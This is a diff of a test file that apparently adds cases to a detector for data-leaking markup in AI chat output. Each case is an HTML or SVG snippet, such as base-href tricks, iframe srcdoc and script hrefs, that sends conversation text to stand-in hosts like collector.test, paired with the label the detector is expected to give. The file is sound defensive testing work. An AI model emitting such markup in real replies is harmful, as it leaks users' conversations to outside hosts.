@@ -671,6 +671,29 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             [],
         ),
         ("<a href='java script:alert(1)'>x</a>", []),
+        (
+            "<div><x><video><div></x></div><source src='https://collector.test/{c}.mp4'></video></x></div>",
+            ["uncheckable_markup"],
+        ),
+        ("<x-card><b>bold</b><i>text</x-card>", []),
+        ("<div><x-card><div></x-card></div></div><img src='https://a.test/a.png'>", ["uncheckable_markup"]),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://safe test/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://safe%20test/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        ("<base href='https://[::1]/'><img src='/a.png'>", []),
         ("<svg><script type='application/json' href='https://collector.test/{c}.json'/></svg>", []),
         ("<svg><script type='text/ecmascript' href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
         ("<svg><script language='vbscript' href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
